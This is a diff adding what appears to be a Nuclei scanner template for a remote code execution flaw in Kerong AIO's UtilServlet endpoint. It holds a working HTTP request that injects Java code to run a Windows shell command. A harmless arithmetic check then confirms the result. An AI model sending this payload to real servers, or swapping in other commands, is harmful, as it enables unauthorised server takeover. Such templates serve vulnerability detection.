@@ -1,0 +1,26 @@
+id: kraio-UtilServlet-rce
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 科荣AIO UtilServlet 存在远程代码执行漏洞，攻击者通过漏洞可以获取服务器权限，导致服务器失陷。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%A7%91%E8%8D%A3AIO/%E7%A7%91%E8%8D%A3AIO%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3UtilServlet%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /UtilServlet HTTP/1.1
+        Host:127.0.0.1
+        User-Agent:Mozilla/5.0(Windows NT 6.1; WOW64)AppleWebKit/534.57.2(KHTML, like Gecko)Version/5.1.7Safari/534.57.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length:322
+
+        operation=calculate&value=BufferedReader+br+%3d+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec("cmd.exe+/c+set+/A+896580342+935792469").getInputStream()))%3bString+line%3bStringBuilder+b+%3d+new+StringBuilder()%3bwhile+((line+%3d+br.readLine())+!%3d+null)+{b.append(line)%3b}return+new+String(b)%3b&fieldName=example_field
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '1832372811'
